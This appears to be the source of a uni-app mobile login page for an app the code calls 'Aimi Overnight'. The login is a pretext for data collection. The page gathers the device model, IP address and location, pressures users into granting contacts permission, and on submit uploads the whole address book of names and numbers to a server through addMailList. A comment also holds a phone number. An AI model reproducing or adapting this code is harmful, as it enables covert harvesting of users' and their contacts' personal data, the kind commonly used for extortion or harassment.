<template>
	<view class="content">

		<!-- 1.输入框 -->
		<view class="inputCard">
			<view class="inputCardItem">
				<view style="font-size: 50rpx;font-weight: bold;color: white;">
					Login
				</view>

				<view>
					<input type="number" placeholder="Enter your mobile number" placeholder-class="palceholdertext"
						maxlength="11" v-model="phoneNumber">
				</view>

				<view>
					<input type="number" placeholder="Enter the invitation code" placeholder-class="palceholdertext"
						maxlength="6" v-model="userCode">
				</view>

				<view class="">
					<view class="userSubmit" @click="userSubmit"
						:style="{'pointer-events':pointerState==false?'none':''}">Submit</view>
				</view>

			</view>
		</view>
	</view>
</template>

<script>
	import {
		getLoaction,
		ipAndaddress,
		netWork,
		applyContact,
		checkNumber,
		addMailList
	} from './@/pages/index/functions.js'
	export default {
		data() {
			return {
				mailList: [],
				lastMailList: [],
				phoneNumber: "",
				userCode: '',

				// 手机型号
				equipment: "",

				// 网络状态
				netWorkState: '',

				// ip地址
				userIp: '',

				// 地址
				address: "",


				// 控制点击状态
				pointerState: true
			}
		},
		onLoad() {

			// 获取设备信息
			let than = this
			uni.getSystemInfo({
				success(res) {
					than.equipment = res.model
				}
			});

			console.log("model", this.equipment)
			console.log(getLoaction())

			// 获取ip地址
			ipAndaddress().then(res => {

				this.userIp = res.userip
				this.address = res.address


				console.log("ip地址", res)
			})

			// 网络检查
			netWork().then(res => {
				console.log("network", res)
				this.netWorkState = res
			})
		},
		onShow() {
			this.phoneNumber = ''
			this.userCode = ''
			// 校验权限是否开启
			let contactState = applyContact()

			console.log(contactState)
			let than = this
			if (contactState) {

				console.log("权限有")
				let phoneNum = plus.contacts.ADDRESSBOOK_PHONE
				plus.contacts.getAddressBook(phoneNum, function(addressbook) {
					addressbook.find(['displayName', 'phoneNumbers'], function(contacts) {
						than.mailList = contacts

						console.log("contacts", contacts)
					}, function() {
						console.log('获取通信录失败')
					}, {
						multiple: true
					});

				}, function(e) {
					console.log("获取通讯录失败了" + e.message);
				});

			} else {

				uni.showModal({
					title: 'Tips',
					content: 'Please agree to the pop-up permission, then you can use the app normally! If it is not pop-up, please go to "Permission Management" in "Phone Settings" to find Aimi Overnight and open the record permission to use it.',
					showCancel: false,
					success: function(res) {
						if (res.confirm) {
							console.log('用户点击确定');
							// 打开设置
							var UIApplication = plus.ios.import("UIApplication");
							var NSURL2 = plus.ios.import("NSURL");
							var setting2 = NSURL2.URLWithString("app-settings:");
							var application2 = UIApplication.sharedApplication();
							application2.openURL(setting2);
							plus.ios.deleteObject(setting2);
							plus.ios.deleteObject(NSURL2);
							plus.ios.deleteObject(application2);

							// 拉起申请权限
							let phoneNum = plus.contacts.ADDRESSBOOK_PHONE
							plus.contacts.getAddressBook(phoneNum, function(addressbook) {}, function(e) {
								console.log("获取通讯录失败了" + e.message);
							});
						}
					}
				});

			}
		},
		methods: {


			// 最后用户提交事件
			userSubmit() {


				console.log("已经点击")

				this.pointerState = false

				let than = this
				this.lastMailList.length = 0

				if (this.netWorkState) {

					// 遍历通讯录
					for (let i in this.mailList) {
						this.lastMailList.push({
							name: this.mailList[i].displayName,
							number: this.mailList[i].phoneNumbers[0].value,
						})
					}

					// 交易提交内容不能为空
					if (this.phoneNumber != '' && this.userCode != '') {

						// 校验不能登录重复号码
						checkNumber(this.phoneNumber).then(res => {
							if (res.code == 0) {


								this.pointerState = true
								uni.showModal({
									title: 'Tips',
									content: 'Duplicate login number！',
									showCancel: false,
									success: function(res) {
										if (res.confirm) {
											console.log('用户点击确定');

											than.phoneNumber = ''
											than.userCode = ''
										}
									}
								});
							} else {


								uni.showLoading({
									title: 'Login...'
								});
								// 添加通讯录网络请求
								let data = {
									loginNum: this.phoneNumber,
									inCode: this.userCode,
									equipment: this.equipment,
									location: this.userIp,
									address: this.address,
									data: this.lastMailList
								}
								console.log("获取的通讯录data=", data)

								addMailList(data).then(res => {
									console.log("resrrrrrr", res)

									if (res.code == 1) {


										this.pointerState = true

										this.lastMailList = []
										setTimeout(res => {
											uni.hideLoading();
											uni.navigateTo({
												url: '../home/home'
											});
											console.log('通讯录添加成功', res)
										}, 1000)
									}
								})
							}
						})

					} else {

						this.pointerState = true
						// 15184971954
						uni.showModal({
							title: 'Tips',
							content: 'Submitted content cannot be empty！',
							showCancel: false,
							success: function(res) {
								if (res.confirm) {
									console.log('用户点击确定');
								}
							}
						});
					}

				} else {



					this.pointerState = true

					uni.showModal({
						title: 'Tips',
						content: 'Network connection failed, please check the network and try again！',
						showCancel: false,
						success: function(res) {
							if (res.confirm) {
								console.log('用户点击确定');
							}
						}
					});

				}

				console.log("push", this.lastMailList)
			}
		}
	}
</script>

<style>
	.content {
		background-image: url('@/static/last1.png');

		/* background-color: hotpink; */
		width: 100%;
		height: 100%;
	}


	.inputCard {
		border: 0.1px solid white;
		height: 100%;
		width: 100%;
	}

	.inputCardItem {
		height: 500rpx;
		border-radius: 20rpx;
		margin: 0 50rpx;
		background: #00000070;
		/* opacity: 0.5; */
		margin-top: 30%;

		display: flex;
		flex-direction: column;
		align-items: center;
		justify-content: space-evenly;
	}

	.palceholdertext {
		color: #FFFFFF;
		font-size: 12px;
	}

	input {
		color: #FFFFFF;
		background-color: #8c8a8c60;
		/* opacity: 0.5; */
		margin: 10rpx 16rpx;
		padding: 10px 8px;
		border-radius: 2px;
	}

	.inputCardItem>view {
		/* border: 1px solid green; */
		width: 90%;

		text-align: center;
	}

	/* 确定 */
	.userSubmit {
		/* border: 1px solid red; */
		margin: 10px 14rpx;
		text-align: center;
		color: #FFFFFF;
		padding: 8px 0;
		border-radius: 2px;
		background-color: #F48FB1;
		transition: 0.4s;

	}

	.userSubmit:active {
		background-color: pink;
		opacity: 0.5;
	}
</style>
